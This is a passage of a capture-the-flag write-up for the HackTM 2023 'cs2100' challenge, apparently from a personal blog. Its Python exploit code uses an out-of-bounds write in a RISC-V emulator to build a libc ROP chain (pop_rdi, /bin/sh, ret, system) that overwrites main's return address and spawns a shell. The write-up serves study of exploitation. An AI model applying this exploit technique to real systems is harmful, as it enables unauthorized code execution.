+</span></span><span class="line"><span class="cl"><span class="n">exec_ADDI</span><span class="p">(</span><span class="n">rd</span><span class="o">=</span><span class="n">A2</span><span class="p">,</span> <span class="n">rs1</span><span class="o">=</span><span class="n">A2</span><span class="p">,</span> <span class="n">imm</span><span class="o">=</span><span class="mh">0x4c3</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl"><span class="n">exec_SLLI</span><span class="p">(</span><span class="n">rd</span><span class="o">=</span><span class="n">A2</span><span class="p">,</span> <span class="n">rs1</span><span class="o">=</span><span class="n">A2</span><span class="p">,</span> <span class="n">imm</span><span class="o">=</span><span class="mh">0x8</span><span class="p">)</span><span class="c1"># &gt;&gt; 8</span>
+</span></span><span class="line"><span class="cl"><span class="n">exec_ADDI</span><span class="p">(</span><span class="n">rd</span><span class="o">=</span><span class="n">A2</span><span class="p">,</span> <span class="n">rs1</span><span class="o">=</span><span class="n">A2</span><span class="p">,</span> <span class="n">imm</span><span class="o">=</span><span class="mh">0x30</span><span class="p">)</span>
+</span></span></code></pre></div><p>With the address of <code>libc.sym['system']</code> in one of the registers, this address can be added to the libc_base address and saved to a different &lsquo;register&rsquo;. This can be done using the <em>exec_ADD</em> instruction that add&rsquo;s two values from &lsquo;registers&rsquo;.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="n">exec_ADD</span><span class="p">(</span><span class="n">rd</span><span class="o">=</span><span class="n">A3</span><span class="p">,</span> <span class="n">rs1</span><span class="o">=</span><span class="n">A1</span><span class="p">,</span> <span class="n">rs2</span><span class="o">=</span><span class="n">A2</span><span class="p">)</span>
+</span></span></code></pre></div><p>
+
+
+
+
+  <figure>
+    <img class="my-0 rounded-md" src="https://i.imgur.com/M6E1Ngz.png" alt="" />
+    
+  </figure>
+
+</p>
+<p>As shown above, the address of system has been written to the <code>A3</code> register. The rest of the addresses <em>pop_rdi</em>, <em>ret</em>, and the address of system were written to the <code>A4</code>, <code>A5</code> and <code>A6</code> respectively, with their absolute addresses written to <code>S2</code>, <code>S3</code> and <code>S4</code> respectively from the following python code snippet:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="c1">#binsh</span>
+</span></span><span class="line"><span class="cl"><span class="n">exec_ADDI</span><span class="p">(</span><span class="n">rd</span><span class="o">=</span><span class="n">A4</span><span class="p">,</span> <span class="n">rs1</span><span class="o">=</span><span class="n">A4</span><span class="p">,</span> <span class="n">imm</span><span class="o">=</span><span class="mh">0x196</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">exec_SLLI</span><span class="p">(</span><span class="n">rd</span><span class="o">=</span><span class="n">A4</span><span class="p">,</span> <span class="n">rs1</span><span class="o">=</span><span class="n">A4</span><span class="p">,</span> <span class="n">imm</span><span class="o">=</span><span class="mh">0xc</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">exec_ADDI</span><span class="p">(</span><span class="n">rd</span><span class="o">=</span><span class="n">A4</span><span class="p">,</span> <span class="n">rs1</span><span class="o">=</span><span class="n">A4</span><span class="p">,</span> <span class="n">imm</span><span class="o">=</span><span class="mh">0x031</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#pop_rdi</span>
+</span></span><span class="line"><span class="cl"><span class="n">exec_ADDI</span><span class="p">(</span><span class="n">rd</span><span class="o">=</span><span class="n">A5</span><span class="p">,</span> <span class="n">rs1</span><span class="o">=</span><span class="n">A5</span><span class="p">,</span> <span class="n">imm</span><span class="o">=</span><span class="mh">0x277</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">exec_SLLI</span><span class="p">(</span><span class="n">rd</span><span class="o">=</span><span class="n">A5</span><span class="p">,</span> <span class="n">rs1</span><span class="o">=</span><span class="n">A5</span><span class="p">,</span> <span class="n">imm</span><span class="o">=</span><span class="mh">0x8</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">exec_ADDI</span><span class="p">(</span><span class="n">rd</span><span class="o">=</span><span class="n">A5</span><span class="p">,</span> <span class="n">rs1</span><span class="o">=</span><span class="n">A5</span><span class="p">,</span> <span class="n">imm</span><span class="o">=</span><span class="mh">0x25</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#ret</span>
+</span></span><span class="line"><span class="cl"><span class="n">exec_ADDI</span><span class="p">(</span><span class="n">rd</span><span class="o">=</span><span class="n">A6</span><span class="p">,</span> <span class="n">rs1</span><span class="o">=</span><span class="n">A6</span><span class="p">,</span> <span class="n">imm</span><span class="o">=</span><span class="mh">0x270</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">exec_SLLI</span><span class="p">(</span><span class="n">rd</span><span class="o">=</span><span class="n">A6</span><span class="p">,</span> <span class="n">rs1</span><span class="o">=</span><span class="n">A6</span><span class="p">,</span> <span class="n">imm</span><span class="o">=</span><span class="mh">0x8</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">exec_ADDI</span><span class="p">(</span><span class="n">rd</span><span class="o">=</span><span class="n">A6</span><span class="p">,</span> <span class="n">rs1</span><span class="o">=</span><span class="n">A6</span><span class="p">,</span> <span class="n">imm</span><span class="o">=</span><span class="mh">0xc2</span><span class="p">)</span>
+</span></span></code></pre></div><p>These absolute libc addresses of the above gadgets can further be written into the <code>S2</code>, <code>S3</code> and <code>S4</code> register from the following python code snippet:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">exec_ADD</span><span class="p">(</span><span class="n">rd</span><span class="o">=</span><span class="n">S2</span><span class="p">,</span> <span class="n">rs1</span><span class="o">=</span><span class="n">A1</span><span class="p">,</span> <span class="n">rs2</span><span class="o">=</span><span class="n">A4</span><span class="p">),</span> <span class="c1"># binsh</span>
+</span></span><span class="line"><span class="cl"><span class="n">exec_ADD</span><span class="p">(</span><span class="n">rd</span><span class="o">=</span><span class="n">S3</span><span class="p">,</span> <span class="n">rs1</span><span class="o">=</span><span class="n">A1</span><span class="p">,</span> <span class="n">rs2</span><span class="o">=</span><span class="n">A5</span><span class="p">),</span> <span class="c1"># pop_rdi</span>
+</span></span><span class="line"><span class="cl"><span class="n">exec_ADD</span><span class="p">(</span><span class="n">rd</span><span class="o">=</span><span class="n">S4</span><span class="p">,</span> <span class="n">rs1</span><span class="o">=</span><span class="n">A1</span><span class="p">,</span> <span class="n">rs2</span><span class="o">=</span><span class="n">A6</span><span class="p">),</span> <span class="c1"># ret</span>
+</span></span></code></pre></div><p>
+
+
+
+
+  <figure>
+    <img class="my-0 rounded-md" src="https://i.imgur.com/w1rZnrt.png" alt="" />
+    
+  </figure>
+
+</p>
+<p>The <em>OOBW</em> vulnerability can now be used to overwrite the saved return address of main at <code>mem[sp+0x18]</code> with the above addresses in the &lsquo;registers&rsquo;. The rop chain should be in the following format:</p>
+<p><code>pop_rdi Gadget</code> + <code>&amp;binsh</code> + <code>ret gadget</code> + <code>&amp;System()</code>.</p>
+<p><em>The above gadgets were returned from libc with the return gagdget used to align the stack</em></p>
+<p>These addresses can be written to <em>main&rsquo;s</em> stack using the <em>exec_SD</em> instruction as follows:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="c1">#overwrite values on the stack</span>
+</span></span><span class="line"><span class="cl"><span class="n">exec_SD</span><span class="p">(</span><span class="n">rs1</span><span class="o">=</span><span class="n">SP</span><span class="p">,</span> <span class="n">rs2</span><span class="o">=</span><span class="n">S3</span><span class="p">,</span> <span class="n">imm</span><span class="o">=</span><span class="mi">24</span><span class="p">),</span> <span class="c1"># pop_rdi</span>
+</span></span><span class="line"><span class="cl"><span class="n">exec_SD</span><span class="p">(</span><span class="n">rs1</span><span class="o">=</span><span class="n">SP</span><span class="p">,</span> <span class="n">rs2</span><span class="o">=</span><span class="n">s2</span><span class="p">,</span> <span class="n">imm</span><span class="o">=</span><span class="mi">32</span><span class="p">),</span> <span class="c1"># &amp;binsh</span>
+</span></span><span class="line"><span class="cl"><span class="n">exec_SD</span><span class="p">(</span><span class="n">rs1</span><span class="o">=</span><span class="n">SP</span><span class="p">,</span> <span class="n">rs2</span><span class="o">=</span><span class="n">S4</span><span class="p">,</span> <span class="n">imm</span><span class="o">=</span><span class="mi">40</span><span class="p">),</span> <span class="c1"># ret</span>
+</span></span><span class="line"><span class="cl"><span class="n">exec_SD</span><span class="p">(</span><span class="n">rs1</span><span class="o">=</span><span class="n">SP</span><span class="p">,</span> <span class="n">rs2</span><span class="o">=</span><span class="n">A3</span><span class="p">,</span> <span class="n">imm</span><span class="o">=</span><span class="mi">48</span><span class="p">),</span> <span class="c1"># &amp;system</span>
+</span></span></code></pre></div><p>The above code snippet will overwrite the saved return address with the above rop chain, and when the application is run and the bin file is passed to it as its argument, this returns a shell for code execution as shown below:</p>
+<p>
+
+
+
+
+  <figure>
+    <img class="my-0 rounded-md" src="https://i.imgur.com/4nMYgZI.png" alt="" />
+    
+  </figure>
+
+</p>
+<p>The full exploit code can be found here <a href="https://github.com/mutur4/ctf-writeups/blob/main/HackTM2023/cs2100/exploit.py"   target="_blank">
+    exploit.py</a></p>
+<div id="conclusion" class="anchor"></div>
+<h3 class="relative group">Conclusion 
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#conclusion" aria-label="Anchor">#</a></span>        
+    
+</h3>
+<p>On the instance that was hosting the challenge, it prevented the spawning of a remote shell to read the a flag by redirecting <code>stdin</code> to <em>/dev/null</em>.  This therefore required reading the flag directly, using <code>/bin/cat flag</code>, that could either be written to memory in one of the RISC-V registers and passed to <em>system()</em> or <em>execve()</em>.</p>
+
+    </div>
+    <script>
+      var oid = "views_ctfs\/hacktm-ctf-2023\/_index.md"
+      var oid_likes = "likes_ctfs\/hacktm-ctf-2023\/_index.md"
+    </script>
+    
+    
+    <script type="text/javascript" src="/js/page.min.0e49973b4ad0a382c7c6012d8bff8226316642daabc4f8a20477bd08674f3da6e2fa993bc20ad4f51e7c5bb68e6f913a207a7c4fe37ea0e7b806894afce0a64e.js" integrity="sha512-DkmXO0rQo4LHxgEti/&#43;CJjFmQtqrxPiiBHe9CGdPPabi&#43;pk7wgrU9R58W7aOb5E6IHp8T&#43;N&#43;oOe4BolK/OCmTg=="></script>
+  </section>
+  
+  <section class="mt-10 prose dark:prose-invert">
+    <p class="py-8 border-t">
+      <em>There's no articles to list here yet.</em>
+    </p>
+  </section>
+  
+
+    
+
+  
+      <div class="pointer-events-none absolute top-[100vh] bottom-0 w-12 ltr:right-0 rtl:left-0">
+  <a href="#the-top"
+    class="pointer-events-auto sticky top-[calc(100vh-5.5rem)] flex h-12 w-12 mb-16 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 backdrop-blur hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400"
+    aria-label="Scroll to top" title="Scroll to top">
+    &uarr;
+  </a>
+</div>
+    </main><footer class="py-10 print:hidden">
+  
+  
+    
+    <nav class="flex flex-row pb-4 text-base font-medium text-neutral-500 dark:text-neutral-400">
+      <ul class="flex flex-col list-none sm:flex-row">
+        
+        <li class="flex mb-1 ltr:text-right rtl:text-left sm:mb-0 ltr:sm:mr-7 ltr:sm:last:mr-0 rtl:sm:ml-7 rtl:sm:last:ml-0">
+          <a class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2" href="/tags/"
+            title="Tags">Tags</a>
+        </li>
+        
+      </ul>
+    </nav>
+    
+  
+  <div class="flex items-center justify-between">
+
+    
+    
+    <p class="text-sm text-neutral-500 dark:text-neutral-400">
+      &copy;
+      2023
+      BinaryChunk
+    </p>
+    
+
+    
+    
+    <p class="text-xs text-neutral-500 dark:text-neutral-400">
+      
+      
+      Powered by <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
+        href="https://gohugo.io/" target="_blank" rel="noopener noreferrer">Hugo</a> &amp; <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
+        href="https://blowfish.page/" target="_blank" rel="noopener noreferrer">Blowfish</a>
+    </p>
+    
+
+  </div>
+  <script>
+    
+    mediumZoom(document.querySelectorAll("img:not(.nozoom)"), {
+      margin: 24,
+      background: 'rgba(0,0,0,0.5)',
+      scrollOffset: 0,
+    })
+    
+  </script>
+  
+  
+  <script type="text/javascript" src="/js/process.min.611c2f100351230a9f8fc00f14b270e9496cc3730da5a6d76742ce62982fe905bce336819ddb93eb75a002b363b7847f3a8d4d3a6feaf79861feb2c889ffae87.js" integrity="sha512-YRwvEANRIwqfj8APFLJw6Ulsw3MNpabXZ0LOYpgv6QW84zaBnduT63WgArNjt4R/Oo1NOm/q95hh/rLIif&#43;uhw=="></script>
+  
+  
+</footer><div
+  id="search-wrapper"
+  class="invisible fixed inset-0 flex h-screen w-screen cursor-default flex-col bg-neutral-500/50 p-4 backdrop-blur-sm dark:bg-neutral-900/50 sm:p-6 md:p-[10vh] lg:p-[12vh]"
+  data-url="https://mutur4.github.io/"
+  style="z-index:500"
+>
+  <div
+    id="search-modal"
+    class="flex flex-col w-full max-w-3xl min-h-0 mx-auto border rounded-md shadow-lg top-20 border-neutral-200 bg-neutral dark:border-neutral-700 dark:bg-neutral-800"
+  >
+    <header class="relative z-10 flex items-center justify-between flex-none px-2">
+      <form class="flex items-center flex-auto min-w-0">
+        <div class="flex items-center justify-center w-8 h-8 text-neutral-400">
+          
+
+  <span class="relative block icon">
+    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+
+  </span>
+
+
+        </div>
+        <input
+          type="search"
+          id="search-query"
+          class="flex flex-auto h-12 mx-1 bg-transparent appearance-none focus:outline-dotted focus:outline-2 focus:outline-transparent"
+          placeholder="Search"
+          tabindex="0"
+        />
+      </form>
+      <button
+        id="close-search-button"
+        class="flex items-center justify-center w-8 h-8 text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"
+        title="Close (Esc)"
+      >
+        
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
+
+  </span>
+
+
+      </button>
+    </header>
+    <section class="flex-auto px-2 overflow-auto">
+      <ul id="search-results">
+        
+      </ul>
+    </section>
+  </div>
+</div>
+
+  </div>
+</body>
+
+<script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js"
+  data-id="https://buymeacoffee.com/binarychunk" data-description="Support me on Buy me a coffee!" data-message=""
+  data-color="#FFDD00" data-position="Right" data-x_margin="18" data-y_margin="18"></script>
+
+</html>
